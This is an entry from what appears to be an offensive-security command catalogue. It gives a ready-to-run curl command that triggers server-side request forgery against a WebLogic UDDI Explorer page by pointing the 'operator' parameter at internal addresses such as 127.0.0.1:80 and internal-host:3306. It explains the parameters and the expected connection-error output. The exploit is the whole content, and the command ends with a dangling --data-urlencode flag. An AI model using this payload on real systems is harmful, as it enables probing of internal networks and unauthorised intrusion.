---
data: >-
  curl -G "http://target-server/uddiexplorer/SearchPublicRegistries.jsp" -d
  "operator=http://127.0.0.1:80" -d "rdoSearch=name" -d "txtSearchname=sdf"
  --data-urlencode
tags:
  - ssrf
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.468Z'
id: 2e01234b-759e-45af-9d45-1683204a0621
verified: false
validated: true
submitted: true
---
# curl-ssrf-trigger

## Command

```bash
curl -G "http://target-server/uddiexplorer/SearchPublicRegistries.jsp" -d "operator=http://127.0.0.1:80" -d "rdoSearch=name" -d "txtSearchname=sdf" --data-urlencode
```

## Description

Triggers SSRF by submitting a GET request with the malicious 'operator' parameter to force server connections.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -G | Treat data as GET parameters | Yes |
| -d | Data parameters like operator | Yes |
| --data-urlencode | URL-encode data | Yes |

## Examples

### Basic Usage

```bash
curl -G "http://target-server/uddiexplorer/SearchPublicRegistries.jsp" -d "operator=http://127.0.0.1:80" -d "rdoSearch=name" -d "txtSearchname=sdf" --data-urlencode
```

### Advanced Usage

```bash
curl -G "http://target-server/uddiexplorer/SearchPublicRegistries.jsp" -d "operator=http://internal-host:3306" -d "rdoSearch=name" --data-urlencode
```

## Expected Output

Server response with potential connection error details, such as ConnectException.

## Related

- [[Related Procedure]]
